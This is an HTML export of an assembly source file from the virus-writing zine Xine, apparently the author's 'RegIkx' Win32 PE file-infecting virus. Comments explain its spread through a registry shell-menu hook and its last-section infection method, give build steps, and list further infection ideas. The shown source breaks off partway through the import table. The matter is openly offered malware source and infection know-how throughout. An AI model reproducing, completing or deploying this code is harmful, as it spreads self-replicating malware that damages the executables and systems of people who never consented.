<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 205 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;Again a new virus idea, for a long time I have chatted away about</span><span class="sc0">
</span><span class="sc1">;this type of virus. Finaly relaizing that no one else wanted to do this</span><span class="sc0">
</span><span class="sc1">;I did it. This was a what i call a dead time project. Whenever I had</span><span class="sc0">
</span><span class="sc1">;spare time I worked on it sometimes it sat for a month b4 I looked at it</span><span class="sc0">
</span><span class="sc1">;again. This lead to strange code, due to every time I did feel like</span><span class="sc0">
</span><span class="sc1">;working on it I was intrigue with a new concept, nothing major, but enough</span><span class="sc0">
</span><span class="sc1">;to make the code seem more hodgepodge then my usual mess :&gt;. (Sorry to all</span><span class="sc0">
</span><span class="sc1">;the coders who do not like upper and lower mix of chars, but I sorta like it) </span><span class="sc0">
</span><span class="sc1">;Alright the program is made up to 2 parts One a regular PE file made by tasm</span><span class="sc0">
</span><span class="sc1">;but modified with debug.</span><span class="sc0">

</span><span class="sc1">;First it is compile with</span><span class="sc0">
</span><span class="sc1">;tasm32 /ml /m3 reg,;  </span><span class="sc0">
</span><span class="sc1">;tlink32 /Tpe /aa /c /B:0400000 -x  reg,r1,,,</span><span class="sc0">
</span><span class="sc1">;this creates a file that has .DATA only section , I hand code the IData stuff</span><span class="sc0">
</span><span class="sc1">;see cerebrus virus for more info on this</span><span class="sc0">
</span><span class="sc1">;then I use a debug script to modify a few things</span><span class="sc0">

</span><span class="sc1">;Increase Header size to 600h           Allow the full header</span><span class="sc0">
</span><span class="sc1">;                                       to be copy into Memory</span><span class="sc0">

</span><span class="sc1">;Set Idata Location                     So OS knows where to load the Idata</span><span class="sc0">
</span><span class="sc1">;Set Idata Size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Set Flags of the DATA sect to R/W/Exec Not really need since data will</span><span class="sc0">
</span><span class="sc1">;                                       execute fine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Edit the BASE of the Code              Since I have no code section</span><span class="sc0">
</span><span class="sc1">;Edit Size     of Code                  Tasm does not set these and WinNt</span><span class="sc0">
</span><span class="sc1">;                                       Chokes if not set properly </span><span class="sc0">

</span><span class="sc1">;Move the PE Header from 100h to 80h    Why not, actual gives me more free</span><span class="sc0">
</span><span class="sc1">;                                       space in one spot for say other</span><span class="sc0">
</span><span class="sc1">;                                       viruses Not really use in this virus</span><span class="sc0">
</span><span class="sc1">;Move any code up to the end of the header area again not really use in this</span><span class="sc0">
</span><span class="sc1">;virus just an idea I was curoius about.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Allright now we have a 2000h exe which when run will look for the command line</span><span class="sc0">
</span><span class="sc1">;and execute the exe file if it is there</span><span class="sc0">
</span><span class="sc1">;Now before it executes the file it will infecting using standard technique of</span><span class="sc0">
</span><span class="sc1">;expanding the last section and ensuring the last section is r/w</span><span class="sc0">
</span><span class="sc1">;How may you ask does the file get someone to give it a exe name as a command</span><span class="sc0">
</span><span class="sc1">;line you may ask. When the file it has infected is run the second part of</span><span class="sc0">
</span><span class="sc1">;the code it run. Using standard vx technique's to find the k32 API it needs</span><span class="sc0">
</span><span class="sc1">;It first reads the Registry entry  "HKEY_CLASSES_ROOT\exefile\shell\test\command",0</span><span class="sc0">
</span><span class="sc1">; it checks if the entry starts with RegIkx.exe, if so dont bother if not</span><span class="sc0">
</span><span class="sc1">;it writes the entry "RegIkx.exe" %1 %*</span><span class="sc0">
</span><span class="sc1">;(So when someone right clicks on the mouse over a ExeFile they will see</span><span class="sc0">
</span><span class="sc1">;Test as one of the Options if then then click test windows runs</span><span class="sc0">
</span><span class="sc1">;"Regikx.exe" FullPathFileName CommandLine Parms this is how the file spreads)</span><span class="sc0">
</span><span class="sc1">;Now it gets the Windows Directory and creats RegIkx.exe in it. then</span><span class="sc0">
</span><span class="sc1">;close the File, close the Registry and jmps back to the host</span><span class="sc0">
</span><span class="sc1">;Clear as Murky Water right :&gt;</span><span class="sc0">
</span><span class="sc1">;I Use a space as first char of the last section name to id file as infected</span><span class="sc0">
</span><span class="sc1">;Display a poem when no command line is passed to it</span><span class="sc0">
</span><span class="sc1">;may as well confuse the issue in case a user does decide to run the exe by</span><span class="sc0">
</span><span class="sc1">;itself</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Well the rest is in the code, you can recompile with a Diffrent Register</span><span class="sc0">
</span><span class="sc1">;setting which will then call RegIkx every time the user clicks on a exe</span><span class="sc0">
</span><span class="sc1">;I have that setting rem out for testing purposes</span><span class="sc0">
</span><span class="sc1">;Well enjoy and Read the code</span><span class="sc0">
</span><span class="sc1">;Murkry</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;As usual what follows is notes I made as I was working on this</span><span class="sc0">
</span><span class="sc1">;project</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This is being compile with no code of idata section</span><span class="sc0">
</span><span class="sc1">;only the a DATA section which in Win9? can still execute code???</span><span class="sc0">
</span><span class="sc1">;as a side note this seems that while code is code data it code as well</span><span class="sc0">
</span><span class="sc1">;you can then put code in the k32 data section and execute it....</span><span class="sc0">
</span><span class="sc1">;not sure if winnt supports this but I did try stack space in winnt 4.0,</span><span class="sc0">
</span><span class="sc1">;yes it let me execute it fine.</span><span class="sc0">
</span><span class="sc1">;to be sure I am altering the flags to be code and exec as well as</span><span class="sc0">
</span><span class="sc1">;the data the flags will then be 600000E0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The "RealFile will infect the files off the commandline</span><span class="sc0">
</span><span class="sc1">;copying the first 600h bytes from the MZ header then copy the</span><span class="sc0">
</span><span class="sc1">;next 600 from the start of the "virii" code down the infect addtion</span><span class="sc0">
</span><span class="sc1">; to the end file should be about 800-900; probaly be easier to copy</span><span class="sc0">
</span><span class="sc1">;the header to the top of the section then we can add and change things as we</span><span class="sc0">
</span><span class="sc1">;go</span><span class="sc0">
</span><span class="sc1">;Why 600 when the header size is usual 400h simple Borland pads everthing</span><span class="sc0">
</span><span class="sc1">;so there is a extra 200 bytes that lay in waste on disk but do not get loaded</span><span class="sc0">
</span><span class="sc1">;to memory, unless you make the header size 600h which I do in the debug</span><span class="sc0">
</span><span class="sc1">;script</span><span class="sc0">
</span><span class="sc1">;so the file looks like this</span><span class="sc0">
</span><span class="sc1">;       on disk                     in memory after  move</span><span class="sc0">
</span><span class="sc1">;       ----------------            -----------------</span><span class="sc0">
</span><span class="sc1">;       MZ                   400000 MZ</span><span class="sc0">
</span><span class="sc1">;    80 PE                       80 PE</span><span class="sc0">
</span><span class="sc1">;       data or code                   data or code but exec not Write</span><span class="sc0">
</span><span class="sc1">;   600 Excutable code          600 End of header</span><span class="sc0">
</span><span class="sc1">;       idata cod data       401000 MZ</span><span class="sc0">
</span><span class="sc1">;                                80 PE</span><span class="sc0">
</span><span class="sc1">;                                   Usable Data or code r/w exec</span><span class="sc0">
</span><span class="sc1">;                               600 Idata code data</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Now when writing this file  as infection write from 401000 to end of code</span><span class="sc0">
</span><span class="sc1">;to recreate Excutable file write from 401000 for lenght of code pad to 4096</span><span class="sc0">
</span><span class="sc1">;****Note in winnt4.0 the file would just "exit" do nothing or at least</span><span class="sc0">
</span><span class="sc1">;appear to do that. Under Td32 in NT it would "error loading program"</span><span class="sc0">
</span><span class="sc1">;So I made entries to the SizeOfCode and BaseOfCode this allow it to work</span><span class="sc0">
</span><span class="sc1">;but then failed cause I cheated and used "USER32" not "USER32.DLL ok adjusted for</span><span class="sc0">
</span><span class="sc1">;that and all OK..Cept run from command line only file name but click on then</span><span class="sc0">
</span><span class="sc1">;full path name was passed. Oh well, I guess that there are some incompatiblity</span><span class="sc0">
</span><span class="sc1">;with the win32 subsets ;))</span><span class="sc0">

</span><span class="sc1">;Reg setting exefile infect "D:\TASM\VIRII\REGHOOK\R1.EXE" %1 %*</span><span class="sc0">
</span><span class="sc1">;Of course in real virus the exe would be in a windows directory</span><span class="sc0">
</span><span class="sc1">;so "R1.EXE" %1 %*  would work fine and Of course I use RegIkx.exe for</span><span class="sc0">
</span><span class="sc1">;final edition</span><span class="sc0">

</span><span class="sc1">;ideas to play with</span><span class="sc0">
</span><span class="sc1">;   Stack Infector use stack for code and data</span><span class="sc0">
</span><span class="sc1">;   modify the .text section to be data as well then you can write the</span><span class="sc0">
</span><span class="sc1">;      orginal "host" back after spreading</span><span class="sc0">
</span><span class="sc1">;   have a small "dos" prog modify one of the system dll's for code to data</span><span class="sc0">
</span><span class="sc1">;     the real virus code then goes tsr at the second run    </span><span class="sc0">
</span><span class="sc1">;   Write code that infects the data section and runs from there as well</span><span class="sc0">
</span><span class="sc1">;     just mod the eip to pnt there this opens up the idata,data,resc,reloc</span><span class="sc0">
</span><span class="sc1">;     just about any section can  be infected... 'cept AV'ers check this</span><span class="sc0">
</span><span class="sc1">; While I do not try to hide from AV'rs scanners I do try to mention methods</span><span class="sc0">
</span><span class="sc1">;that Av'ers should use  </span><span class="sc0">
 
</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;REM THIS LINE TO REMOVE DEBUG CODE</span><span class="sc0">
</span><span class="sc1">;-------------------------------</span><span class="sc0">
</span><span class="sc1">;Used for access to the Registery</span><span class="sc0">
</span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">REG_OPTION_NON_VOLATILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;sometime I used this, note that many API return nonzero to signify</span><span class="sc0">
</span><span class="sc1">; True so  True != 0 is a better check </span><span class="sc0">
</span><span class="sc5">True</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">False</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;MZ pnter to PE or NE or LE ...</span><span class="sc0">
</span><span class="sc5">NEptr</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03ch</span><span class="sc0">

</span><span class="sc1">;Locations in PE header use JQwerty's(29A) inc files for more complete</span><span class="sc0">
</span><span class="sc1">;header info and other nice tricks</span><span class="sc0">
</span><span class="sc5">SectHdrSze</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">028H</span><span class="sc0">
</span><span class="sc5">ImageSze</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">050h</span><span class="sc0">
</span><span class="sc5">PEHdrSze</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0F8h</span><span class="sc0">

</span><span class="sc1">;-------------------------------</span><span class="sc0">
</span><span class="sc1">;PE Header Offsets</span><span class="sc0">
</span><span class="sc5">NumOfSect</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">EipOff</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc5">SectAlign</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">38h</span><span class="sc0">
</span><span class="sc5">FileAlign</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3Ch</span><span class="sc0">

</span><span class="sc1">;-------------------------------</span><span class="sc0">
</span><span class="sc1">;Section Entry Offsets</span><span class="sc0">
</span><span class="sc5">SectName</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">SectVsze</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8h</span><span class="sc0">
</span><span class="sc5">SectVadd</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">SectRawSze</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">SectPtrRaw</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc1">;Stuff not used</span><span class="sc0">
</span><span class="sc5">SectChar</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24h</span><span class="sc0">

</span><span class="sc1">;-------------------------------</span><span class="sc0">
</span><span class="sc1">;USed in CreateFile API calls</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">FATTR_NORMAL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">CREATE_NEW</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;Used for the Idata Section to get proper offsets</span><span class="sc0">
</span><span class="sc1">;I sometime have very convolted code that could be replaced with</span><span class="sc0">
</span><span class="sc1">; One static equ rather than the nonsense I typed, live with it...</span><span class="sc0">
</span><span class="sc1">;better yet..consider it a exercise for the student...</span><span class="sc0">

</span><span class="sc5">LoadAT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01000h</span><span class="sc0">
</span><span class="sc5">offs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc1">;+  LoadAT   + 400000h </span><span class="sc0">

</span><span class="sc5">filler</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">

</span><span class="sc1">;Start of Code which is actaul in a section called Data</span><span class="sc0">
 

</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">PEheader</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;will hold the Orginal MZ/PE info</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1A0h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Anything beyond this is data that will be carrier over from</span><span class="sc0">
</span><span class="sc1">;infection to infection after the first infection this will</span><span class="sc0">
</span><span class="sc1">;be copyed to a buffer area to be used for our code</span><span class="sc0">
</span><span class="sc1">;I used a debug script to make the intial file</span><span class="sc0">
</span><span class="sc1">;in most case this is just for placeholders exeptions are strings</span><span class="sc0">
</span><span class="sc1">;or numerics the virus really needs then they would be placed here</span><span class="sc0">
</span><span class="sc1">;then moved by the debug script</span><span class="sc0">
</span><span class="sc5">sBlank</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;Used for temp storage</span><span class="sc0">
</span><span class="sc5">fHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;Open File Handle</span><span class="sc0">
</span><span class="sc5">PtrAddNew</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;Where the write the New Info</span><span class="sc0">

</span><span class="sc5">AddSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;Amount we have added to the file</span><span class="sc0">

</span><span class="sc1">;NewEip          dd      ?</span><span class="sc0">

</span><span class="sc5">ProcessInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">EXEcName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">crTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">laTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">lwTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> 

</span><span class="sc1">;*******temp    db      "c:\windows\notepad.exe",0</span><span class="sc0">

</span><span class="sc5">BodyTitle</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Stoddart, And It Never Comes Again"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">BodyMsg</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"There are gains for all our losses,"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" There are balms for all our pain,"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"But when youth, the dream, departs"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"It takes something from our hearts,"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" and it never comes again"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"             Murkry/IkX"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Making life fun through 'tronic life"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"             RegIkx.ExE"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Data area stops and the place holder takes over</span><span class="sc0">
</span><span class="sc1">;place holder used the formala so the IDATA always starts at 600h</span><span class="sc0">

</span><span class="sc5">Data</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;place holder so we pad this out properly</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">600h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc5">filler</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;The Infection part of the Virus uses the </span><span class="sc0">
</span><span class="sc5">IDATA</span><span class="sc4">:</span><span class="sc0">  
          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2b</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
                                </span><span class="sc1">;  usual this has a redunat entry</span><span class="sc0">
                                </span><span class="sc1">;We are not skipping it</span><span class="sc0">
                                </span><span class="sc1">;  offset API_LOC1 - offset PEheader + LoadAT</span><span class="sc0">
                                                         
</span><span class="sc5">T1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;time date stamp</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;where in memory this dll is loaded</span><span class="sc0">
 
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLL1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">        

        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">     
 
</span><span class="sc1">;--------second DLL</span><span class="sc0">

        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2Ab</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
                                </span><span class="sc1">;  usual this has a redunt entry</span><span class="sc0">
                                </span><span class="sc1">;We are  not skipping it</span><span class="sc0">
                                </span><span class="sc1">;  offset API_LOC1 - offset PEheader + LoadAT</span><span class="sc0">
                                                         
</span><span class="sc5">T2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;time date stamp</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;where in memory this dll is loaded</span><span class="sc0">
 
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLLA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">

        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2A</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">     
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000H</span><span class="sc0">


        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">10H</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">API_LOC2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exitp</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">beep</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;4h</span><span class="sc0">
</span><span class="sc1">;VxdCall0       DD      80000001h                                  ;8h</span><span class="sc0">
</span><span class="sc5">getcomline</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC3</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;Ch</span><span class="sc0">
</span><span class="sc5">createp</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC4</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;10h        </span><span class="sc0">
</span><span class="sc5">Copy</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC5</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
